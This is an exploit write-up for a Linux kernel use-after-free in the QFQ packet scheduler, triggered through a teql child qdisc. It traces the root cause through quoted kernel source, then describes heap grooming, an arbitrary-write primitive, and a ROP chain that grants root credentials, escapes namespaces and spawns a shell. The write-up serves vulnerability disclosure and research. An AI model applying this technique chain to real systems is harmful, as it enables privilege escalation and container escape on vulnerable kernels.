# **Vulnerability**

## Summary

Unlike a normal qdisc, the teql qdisc does not increment `sch->q.qlen` on enqueue and only updates it at dequeue time. Additionally, `teql_peek()` always returns NULL.

This can cause problems when teql is used as a child qdisc of another qdisc. In the case of QFQ, `qdisc_dequeue()` is only called after peek succeeds. Since teql's peek always returns NULL, dequeue is never invoked. And because dequeue is never invoked, teql's `sch->q.qlen` is never updated, so `cl->qdisc->q.qlen` remains 0 even when packets actually exist inside teql.

If the class's lmax is changed in this state, `qfq_change_class()` calls `qfq_deact_rm_from_agg()`. This function determines whether the class is active based on `sch->q.qlen`, and since `sch->q.qlen` is 0, it incorrectly judges the class as "inactive." However, the class was actually still linked in the aggregate's slot list, and this linkage is not cleaned up before the aggregate is freed. As a result, when the deferred packets are later scheduled, a dangling pointer is dereferenced, triggering a Use-After-Free that can potentially lead to privilege escalation.

## **Vulnerability Analysis**

### Aggregate Creation via `qfq_change_class()`

When creating or changing a class in QFQ, `qfq_change_class()` is called.

```c
static int qfq_change_class(struct Qdisc *sch, u32 classid, u32 parentid,
			    struct nlattr **tca, unsigned long *arg,
			    struct netlink_ext_ack *extack)
{
	struct qfq_sched *q = qdisc_priv(sch);
	struct qfq_class *cl = (struct qfq_class *)*arg;
	bool existing = false;
	struct nlattr *tb[TCA_QFQ_MAX + 1];
	struct qfq_aggregate *new_agg = NULL;
	u32 weight, lmax, inv_w, old_weight, old_lmax;
...
set_change_agg:
	sch_tree_lock(sch);
	new_agg = qfq_find_agg(q, lmax, weight);
	if (new_agg == NULL) { /* create new aggregate */
		sch_tree_unlock(sch);
		new_agg = kzalloc(sizeof(*new_agg), GFP_KERNEL); // [1]
		if (new_agg == NULL) {
			err = -ENOBUFS;
			gen_kill_estimator(&cl->rate_est);
			goto destroy_class;
		}
		sch_tree_lock(sch);
		qfq_init_agg(q, new_agg, lmax, weight);
	}
	if (existing)
		qfq_deact_rm_from_agg(q, cl); // [2]
	else
		qdisc_class_hash_insert(&q->clhash, &cl->common);
	qfq_add_to_agg(q, new_agg, cl);
	sch_tree_unlock(sch);
	...
}
```

When creating a class in QFQ, if no matching aggregate is found by `qfq_find_agg()`, a new aggregate is allocated at [1]. When changing the attributes of an existing class, `qfq_deact_rm_from_agg()` is called at [2] to remove the class from its current aggregate.

```c
static struct qfq_aggregate *qfq_find_agg(struct qfq_sched *q,
					  u32 lmax, u32 weight)
{
	struct qfq_aggregate *agg;

	hlist_for_each_entry(agg, &q->nonfull_aggs, nonfull_next)
		if (agg->lmax == lmax && agg->class_weight == weight)
			return agg;

	return NULL;
}
```

`qfq_find_agg()` considers an aggregate to be the same only when both lmax and weight match. Therefore, classes with different weight or lmax values are each linked to separate aggregates. 

By setting up the following structure, separate aggregates are created for class 1:1 and class 1:2 respectively.

```text
ROOT qdisc 1:0 (QFQ)
  ├── class 1:1 (weight=15, lmax=16384) -> netem
  └── class 1:2 (weight=1, lmax=1514)   -> teql
```

The teql qdisc, unlike a normal qdisc, does not increment `sch->q.qlen` on enqueue — it only updates `sch->q.qlen` at dequeue time — and `teql_peek()` always returns NULL.

```c
static int
teql_enqueue(struct sk_buff *skb, struct Qdisc *sch, struct sk_buff **to_free)
{
	struct net_device *dev = qdisc_dev(sch);
	struct teql_sched_data *q = qdisc_priv(sch);

	if (q->q.qlen < READ_ONCE(dev->tx_queue_len)) {
		__skb_queue_tail(&q->q, skb);
		return NET_XMIT_SUCCESS;
	}

	return qdisc_drop(skb, sch, to_free);
}

static struct sk_buff *
teql_dequeue(struct Qdisc *sch)
{
	struct teql_sched_data *dat = qdisc_priv(sch);
	...
	skb = __skb_dequeue(&dat->q);
	...
	sch->q.qlen = dat->q.qlen + q->q.qlen;
	return skb;
}

static struct sk_buff *
teql_peek(struct Qdisc *sch)
{
	/* teql is meant to be used as root qdisc */
	return NULL;
}
```

This can cause problems when teql is used as a child qdisc of another qdisc. In the case of QFQ, `qdisc_dequeue()` is only called after `qdisc_peek_head()` succeeds. Since teql's peek always returns NULL, dequeue is never invoked. And because dequeue is never invoked, teql's `sch->q.qlen` is never updated, so `cl->qdisc->q.qlen` remains 0 even when packets actually exist inside teql.

### Slot List Linkage of Aggregates

When a packet is enqueued to the QFQ class of class 1:1, `qfq_dequeue()` is triggered, which in turn calls `qfq_schedule_agg()` → `qfq_slot_insert()`, storing the address of the class 1:1 aggregate in `slots[0].first`.

```c
static void qfq_slot_insert(struct qfq_group *grp, struct qfq_aggregate *agg,
			    u64 roundedS)
{
	u64 slot = (roundedS - grp->S) >> grp->slot_shift;
	unsigned int i; /* slot index in the bucket list */
	...
	i = (grp->front + slot) % QFQ_MAX_SLOTS;

	hlist_add_head(&agg->next, &grp->slots[i]);
	__set_bit(slot, &grp->full_slots);
}
```

In `hlist_add_head(&agg->next, &grp->slots[i])`, the aggregate's address is inserted into `grp->slots[i]`.

When a packet is enqueued to the QFQ class of class 1:2, `qfq_enqueue()` → `qfq_activate_agg()` → `qfq_schedule_agg()` → `qfq_slot_insert()` is called, storing the address of the class 1:2 aggregate in `slots[0].first`.

Subsequently, as the enqueued packet is dequeued, `qfq_schedule_agg(q, in_serv_agg)` is triggered within `qfq_dequeue()`, which calls `qfq_slot_insert()`. Since `in_serv_agg` is the class 1:1 aggregate, this causes the address of the class 1:1 aggregate to be stored in `slots[0].first` once again. Then `qfq_dequeue()` continues to operate, performing `qfq_choose_next_agg()` → `qfq_front_slot_remove()`, during which the class 1:1 aggregate is removed from `slots[0].first`, leaving the address of the class 1:2 aggregate in `slots[0].first` .

```c
static struct sk_buff *qfq_dequeue(struct Qdisc *sch)
{
	struct qfq_sched *q = qdisc_priv(sch);
	struct qfq_aggregate *in_serv_agg = q->in_serv_agg;
	struct qfq_class *cl;
	struct sk_buff *skb = NULL;
	/* next-packet len, 0 means no more active classes in in-service agg */
	unsigned int len = 0;
	...
	if (len == 0 || in_serv_agg->budget < len) {
		charge_actual_service(in_serv_agg);

		/* recharge the budget of the aggregate */
		in_serv_agg->initial_budget = in_serv_agg->budget =
			in_serv_agg->budgetmax;

		if (!list_empty(&in_serv_agg->active)) {
			/*
			 * Still active: reschedule for
			 * service. Possible optimization: if no other
			 * aggregate is active, then there is no point
			 * in rescheduling this aggregate, and we can
			 * just keep it as the in-service one. This
			 * should be however a corner case, and to
			 * handle it, we would need to maintain an
			 * extra num_active_aggs field.
			*/
			qfq_update_agg_ts(q, in_serv_agg, requeue);
			qfq_schedule_agg(q, in_serv_agg);
		} else if (sch->q.qlen == 0) { /* no aggregate to serve */
			q->in_serv_agg = NULL;
			return NULL;
		}

		/*
		 * If we get here, there are other aggregates queued:
		 * choose the new aggregate to serve.
		 */
		in_serv_agg = q->in_serv_agg = qfq_choose_next_agg(q);
		skb = qfq_peek_skb(in_serv_agg, &cl, &len);
	}
...
	return skb;
}
```

### Dangling Pointer Generation

When the class 1:2 attributes are changed (lmax change), `qfq_change_class()` → `qfq_deact_rm_from_agg()` → `qfq_rm_from_agg()` → `qfq_destroy_agg()` is executed, freeing the class 1:2 aggregate.

```c
/* Deschedule class and remove it from its parent aggregate. */
static void qfq_deact_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	if (cl->qdisc->q.qlen > 0) /* class is active */ // [3]
		qfq_deactivate_class(q, cl);

	qfq_rm_from_agg(q, cl);
}
```

At [3], since teql's `sch->q.qlen` is always 0, the condition is not entered. As a result, `qfq_deactivate_class()` is never called, and the aggregate is not removed from the slot list.

```c
/* Remove class from its parent aggregate. */
static void qfq_rm_from_agg(struct qfq_sched *q, struct qfq_class *cl)
{
	struct qfq_aggregate *agg = cl->agg;

	cl->agg = NULL;
	if (agg->num_classes == 1) { /* agg being emptied, destroy it */
		qfq_destroy_agg(q, agg);
		return;
	}
	qfq_update_agg(q, agg, agg->num_classes-1);
}

static void qfq_destroy_agg(struct qfq_sched *q, struct qfq_aggregate *agg)
{
	hlist_del_init(&agg->nonfull_next);
	q->wsum -= agg->class_weight;
	if (q->wsum != 0)
		q->iwsum = ONE_FP / q->wsum;

	if (q->in_serv_agg == agg)
		q->in_serv_agg = qfq_choose_next_agg(q);
	kfree(agg); // [4]
}
```

When the last class is removed from the aggregate, `qfq_destroy_agg()` is called. At [4], the aggregate is freed, but since the address of the class 1:2 aggregate still remains in `slots[0].first`, a dangling pointer is created.

### Use-After-Free Trigger

At this point, when `qfq_dequeue()` is triggered again due to the delayed netem, `qfq_choose_next_agg()` is called, which invokes `qfq_front_slot_remove(grp)`. In `qfq_slot_head(grp)`, the freed class 1:2 aggregate is retrieved and used, triggering a Use-After-Free.

```c
static struct qfq_aggregate *qfq_choose_next_agg(struct qfq_sched *q)
{
	struct qfq_group *grp;
	struct qfq_aggregate *agg, *new_front_agg;
	u64 old_F;

	qfq_update_eligible(q);
	q->oldV = q->V;

	if (!q->bitmaps[ER])
		return NULL;

	grp = qfq_ffs(q, q->bitmaps[ER]);
	old_F = grp->F;

	agg = qfq_slot_head(grp);

	/* agg starts to be served, remove it from schedule */
	qfq_front_slot_remove(grp); // [5]
...
	return agg;
}

static void qfq_front_slot_remove(struct qfq_group *grp)
{
	struct qfq_aggregate *agg = qfq_slot_head(grp); // [6]

	BUG_ON(!agg);
	hlist_del(&agg->next); // [7]
	if (hlist_empty(&grp->slots[grp->front]))
		__clear_bit(0, &grp->full_slots);
}

static struct qfq_aggregate *qfq_slot_head(struct qfq_group *grp)
{
	return hlist_entry(grp->slots[grp->front].first,
			   struct qfq_aggregate, next);
}
```

At [5], when attempting to remove the first aggregate from the slot, the freed class 1:2 aggregate is retrieved at [6], and a Use-After-Free is triggered at [7].

# Exploit

## UAF-Unlink

```c
struct qfq_aggregate {
	struct hlist_node          next;                 /*     0    16 */
	u64                        S;                    /*    16     8 */
	u64                        F;                    /*    24     8 */
	struct qfq_group *         grp;                  /*    32     8 */
	u32                        class_weight;         /*    40     4 */
	int                        lmax;                 /*    44     4 */
	u32                        inv_w;                /*    48     4 */
	u32                        budgetmax;            /*    52     4 */
	u32                        initial_budget;       /*    56     4 */
	u32                        budget;               /*    60     4 */
	int                        num_classes;          /*    64     4 */
	/* XXX 4-byte hole */
	struct list_head           active;               /*    72    16 */
	struct hlist_node          nonfull_next;         /*    88    16 */
};
```

The `qfq_aggregate` structure is 104 bytes in size, corresponding to kmalloc-128.

The point where the Use-After-Free occurs is `hlist_del()`, and the code is as follows:

```c
static inline void hlist_del(struct hlist_node *n)
{
	__hlist_del(n);
	n->next = LIST_POISON1;
	n->pprev = LIST_POISON2;
}

static inline void __hlist_del(struct hlist_node *n)
{
	struct hlist_node *next = n->next;
	struct hlist_node **pprev = n->pprev;

	WRITE_ONCE(*pprev, next); // [8]
	if (next)
		WRITE_ONCE(next->pprev, pprev);
}
```

The unlink operation is performed at [8] in `__hlist_del()`. If another object can be allocated in the freed region and its values manipulated, this becomes a primitive capable of writing 8 bytes to an arbitrary address.

This vulnerability shares similar characteristics with CVE-2025-38477, so the LL_ATK and NPerm techniques presented in that exploit were utilized.

## Constructing an Arbitrary 8-byte Write Primitive

To construct a primitive capable of writing 8 bytes to an arbitrary address, the `hlist_node` structure values located at offsets 0x0 and 0x8 of the freed region must be controllable. PGV was used for this purpose.

1. Numerous aggregate objects are allocated before and after the UAF-triggering object allocation, so that the entire page where the vulnerable object resides is filled with objects of the same type.
2. After freeing all aggregate objects, the vulnerable object is freed so that the entire page containing the UAF object is returned to the buddy allocator.
3. PGV is sprayed onto the returned buddy page to reclaim the page containing the UAF object, allowing control over the hlist_node values and thereby obtaining an arbitrary 8-byte write primitive.

With the arbitrary write primitive secured, LL_ATK can be performed. LL_ATK is a technique that uses a UAF-Unlink primitive to insert a fake node created by the attacker into an existing kernel linked list, then induces code execution through normal kernel flow.

In this exploit, code execution was achieved by corrupting a function pointer in `rtnl_link_ops`.

Once function pointer corruption is possible, a suitable location must be selected for placing the fake node that will hold the ROP chain. The NPerm technique was utilized here.
During kernel initialization, there are cases where certain freed pages are not fully unmapped from specific kernel resource regions. These pages can later be reallocated in response to userspace `mmap()` requests, resulting in the same page being simultaneously mapped in both userspace and kernel space.

This allows the page contents to be freely manipulated from userspace, and as long as KASLR is bypassed, the kernel virtual address of the page can be calculated. In other words, a kernel memory region is secured where both memory control and address prediction are simultaneously possible.

In this exploit, the [__init_begin, __init_end] region was designated as the fake node location, and ROP gadgets were placed across all pages after mmap().

## ROP

### Bypassing `qfq_peek_skb()`

Before ROP execution, in the `qfq_dequeue()` flow where the UAF occurs, the `(*cl)->qdisc->ops->peek()` call in `qfq_peek_skb()` is executed first.

```c
static inline struct sk_buff *qfq_peek_skb(struct qfq_aggregate *agg,
					   struct qfq_class **cl,
					   unsigned int *len)
{
	struct sk_buff *skb;

	*cl = list_first_entry(&agg->active, struct qfq_class, alist);
	skb = (*cl)->qdisc->ops->peek((*cl)->qdisc);
	if (skb == NULL)
		qdisc_warn_nonwc("qfq_dequeue", (*cl)->qdisc);
	else
		*len = qdisc_pkt_len(skb);

	return skb;
}
```

After analyzing the register state at this point, no suitable gadget was found for a stack pivot. Therefore, an `xor eax, eax; ret` gadget was used to return NULL and pass through this stage.

```c
((size_t*)addr)[FAKE_CL_PTR]       = cl;
((size_t*)addr)[FAKE_QDISC_PTR]    = qdisc;
((size_t*)addr)[FAKE_OPS_PEEK_PTR] = xor_eax_jmp;  // Bypass by returning NULL
```

ROP Chain Construction

Exploit code:

```cpp
    RopChain rop(*g_target, kaslr);
	// skip
    rop.Add(stack_shift2_ret);
    rop.Add(0);
    rop.Add(init_region_base + FAKE_KIND_STRING_INDEX * sizeof(size_t));
    rop.Add(stack_shift5_ret);
    rop.Add(1);
    rop.Add(2);
    rop.Add(0);
    rop.Add(0);
    rop.Add(0);
    rop.Add(stack_shift5_ret);
    rop.Add(1);
    rop.Add(2);
    rop.Add(0);
    rop.Add(0);
    rop.Add(0);
    rop.Add(stack_shift2_ret);
    rop.Add(0);
    rop.Add(stack_pivot);

    // Privilege escalation
    rop.AddRopAction(RopActionId::COMMIT_INIT_TASK_CREDS);
    rop.AddRopAction(RopActionId::SWITCH_TASK_NAMESPACES, {1});

    // Return to userspace
    rop.Add(swapgs_restore_regs_and_return_to_usermode + 54);
    rop.Add(0);
    rop.Add(0);
    rop.Add((uint64_t)get_shell);
    rop.Add(user_cs);
    rop.Add(user_rflags);
    rop.Add(user_rsp & 0xffffffffffffff00);
    rop.Add(user_ss);
```

The ROP chain shares a memory region with the fake `rtnl_link_ops` structure. As a result, structure field values such as the `kind` pointer and the `stack_pivot` address are fixed at specific positions within the ROP chain.

To skip over these fixed values, `stack_shift2_ret` and `stack_shift5_ret` gadgets were used to jump past those regions.

Privilege escalation is then performed using libxdk's RopActions:

- COMMIT_INIT_TASK_CREDS: Executes `commit_creds(prepare_kernel_cred(0))`
- SWITCH_TASK_NAMESPACES: Executes `switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)` to switch to the init process's namespace
Finally, execution returns to userspace via `swapgs_restore_regs_and_return_to_usermode`, where the `get_shell()` function is invoked.

## Exploit Summary

- **Prefetch** → Kernel base address leak
- **NPerm** → Payload placement adjacent to kernel resources
- **LL_ATK** → Fake node insertion
- **Function pointer trigger**
- **ROP** → Privilege escalation (COMMIT_INIT_TASK_CREDS) + namespace escape (SWITCH_TASK_NAMESPACES)

## Additional Notes

This vulnerability shares similar characteristics with CVE-2025-38477, so the LL_ATK and NPerm techniques presented in that exploit were utilized. However, since the related documentation is still in the pull request stage and has not yet been merged, it is referenced by CVE number rather than a direct link.